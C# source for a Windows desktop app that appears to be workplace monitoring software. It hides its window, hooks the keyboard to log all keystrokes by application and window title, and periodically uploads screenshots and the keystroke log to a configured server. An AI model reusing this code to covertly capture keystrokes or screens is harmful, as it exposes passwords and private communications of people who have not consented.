using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using System.Text.Json;
using System.Net;
using System.Json;
using System.Collections.Specialized;

namespace advanced_ckey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            K = new Keyboard();
            InitializeComponent();
            
        }
        private Keyboard _K;

        private Keyboard K
        {
            [MethodImpl(MethodImplOptions.Synchronized)]
            get
            {
                return _K;
            }

            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                if (_K != null)
                {
                    _K.Down -= K_Down;
                }

                _K = value;

                if (_K != null)
                {
                    _K.Down += K_Down;
                }

            }
        }

        public string GetCurrentSoftware()  //get active windows title here
        {
            string software = "";
            if ( this.GetActiveWindowTitle() is string)
            {
                string title = this.GetActiveWindowTitle();
                String[] softwareTokens = title.Split( new[] { " - " }, StringSplitOptions.None );
                software = softwareTokens[softwareTokens.Length - 1];
            }
            return software.Trim();
        }

        public string GetActiveWindowTitle()  //get active windows title here
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void keyboardLanguages() //this function here is to translate user installed language
        {
            for (var index = 0; index < InputLanguage.InstalledInputLanguages.Count; index++)
            {
                textBox2.Text = InputLanguage.InstalledInputLanguages[index].LayoutName.ToString() + textBox2.Text;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
        {

        }

        private void K_Down(string key)
        {
            {
                string title = "";
                string software = this.GetCurrentSoftware();
                if ( this.GetActiveWindowTitle() is string)
                {
                    title = this.GetActiveWindowTitle();
                }
                if ( key is string )
                {
                    
                    if ( ! this.loggedText.ContainsKey( software ) )
                    {
                        this.loggedText[software] = new Dictionary<string, object>();
                    }
                    if ( this.loggedText[software].ContainsKey( title ) )
                    {
                        this.loggedText[software][title] += key;
                    }
                    else
                    {
                        this.loggedText[software][title] = key;
                    }
                }
            }
        }

        public dynamic loggedText = new Dictionary<string, object>();
        public dynamic supParameters = new Dictionary<string, object>();
        public List<NameValueCollection> savedRequests = new List<NameValueCollection>();


        public void screenshot()  // the method that handles the screenshot
        {
            try
            {
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                Bitmap bitmap = new Bitmap( Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);


                using( Graphics captureGraphics = Graphics.FromImage(bitmap) )
                {
                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                }
                string screenshot="";
                using (  System.IO.MemoryStream stream = new System.IO.MemoryStream())
                {
                    bitmap.Save( stream, ImageFormat.Jpeg);
                    byte[] imageBytes = stream.ToArray();
                    screenshot = Convert.ToBase64String(imageBytes);
                }

                string keystrokes = JsonSerializer.Serialize(this.loggedText);
                try
                {
                    string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Log?pc_widget_output_method=JSON";

                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                        NameValueCollection paramsX = new NameValueCollection();

                        paramsX.Add("user_id", Properties.Settings.Default.user_id);
                        paramsX.Add("auth_token", Properties.Settings.Default.auth_token);
                        paramsX.Add("texts", keystrokes);
                        paramsX.Add("screenshot", screenshot);
                        paramsX.Add("window_title", this.GetActiveWindowTitle());
                        paramsX.Add("software", this.GetCurrentSoftware());

                        if ( Properties.Settings.Default.workspaces_to_go != String.Empty )
                        {
                            paramsX.Add( "workspaces", Properties.Settings.Default.workspaces_to_go );
                        }

                        string jsonResponse = "{}";
                        try
                        {
                            Byte[] responseBytes = wc.UploadValues( URI, "POST", paramsX );
                            jsonResponse = Encoding.UTF8.GetString(responseBytes);
                            //    MessageBox.Show( jsonResponse );
                            int ci = 0;
                            foreach( NameValueCollection xParam in this.savedRequests )
                            {
                                try
                                {
                                    wc.UploadValues(URI, "POST", xParam );
                                }
                                catch( Exception dd )
                                {
                                    Console.Write(dd.Message);
                                }
                                this.savedRequests.RemoveAt( ci );
                                ci++;
                            }
                        }
                        catch ( Exception g )
                        {
                            this.savedRequests.Add( paramsX );
                            Console.Write(g.Message);
                        }
                        this.loggedText.Clear(); 
                        dynamic result = JsonValue.Parse(jsonResponse);


                        try
                        {
                            if( result.ContainsKey( "authenticated" ) && result["authenticated"] == false )
                            {
                                
                                Program.GetSignInForm().Show();
                                return;
                            }
                            return;
                            //    MessageBox.Show( result["goodnews"] );

                        }
                        catch (Exception ex )
                        {
                            Console.Write(ex.Message);
                            if (  result.ContainsKey( "authenticated" ) && result["authenticated"] == false )
                            {
                                Program.GetClockInForm().LogOutNow();
                            }
                            return;
                        }

                    }

                }
                catch (Exception r )
                {
                    Console.Write(r.Message);
/* 
                    if (helper.iswaiting == false)
                    {
                        helper.islogged = false;
                        Program.GetClockInForm().setClockButtons();
                        //  var k = new Formlog();
                        Program.GetSignInForm().Show();

                    }
 */                }
            }
            catch(Exception c )
            {
                Console.Write(c.Message);

                if (helper.iswaiting == false)
                {
                    helper.islogged = false;
                    Program.GetClockInForm().setClockButtons();
                    Program.GetSignInForm().Show();
                }
                // MessageBox.Show( x1.Message );
            }
        }

        public void savetextfile()    // method saving textfile to file explorer
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            keylog_timer.Start();   // write textbox1.text strings into a file
            Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
            keyboardLanguages();  //get the keyboard language {input keyboard language installed}
            keylog_infomation();  // calls keylog_information
        }

        public void keylog_infomation()
        {
            var switchExpr = Properties.Settings.Default.browser;
            switch (switchExpr)
            {
                case 0:
                    {
                        Properties.Settings.Default.browser = 1;
                        Properties.Settings.Default.Save();
                        Properties.Settings.Default.Reload();
                        break;
                    }

                case 1:
                    {
                        timer4.Start();  // if case 1 clears saved web browser content
                        break;
                    }

                case 2:
                    {
                        break;
                    }

                default:
                    {
                        break;
                    }
            }

            try
            {
                K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                timer1.Start();   // gets active window name and if not wanted delete this line of code
            }
            catch (Exception)
            {
            }
       
        }
       
        private void keylog_timer_Tick(object sender, EventArgs e)
        {
        //    savetextfile();
        }

        private void Sceenshot_timer_Tick(object sender, EventArgs e)
        {
            if (helper.islogged == true)
            {
                screenshot();
            }
        }

        [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int ToUnicodeEx(Keys wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
        //    Application.Exit();
        }

       
        protected void Displaynotify()
        {
            try
            {
                notifyIcon1.Text = "Workplace";
                notifyIcon1.Visible = true;
                notifyIcon1.BalloonTipTitle = "Login or Change workplace";
                notifyIcon1.BalloonTipText = "Change your workplace now";
                notifyIcon1.ShowBalloonTip(1000000);
            }
            catch (Exception)
            {
            }
        }

        private void notifyIcon1_BalloonTipClicked(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void notifyIcon1_Click(object sender, EventArgs e)
        {
            Program.GetClockInForm().Show();
        }
    }
}

  

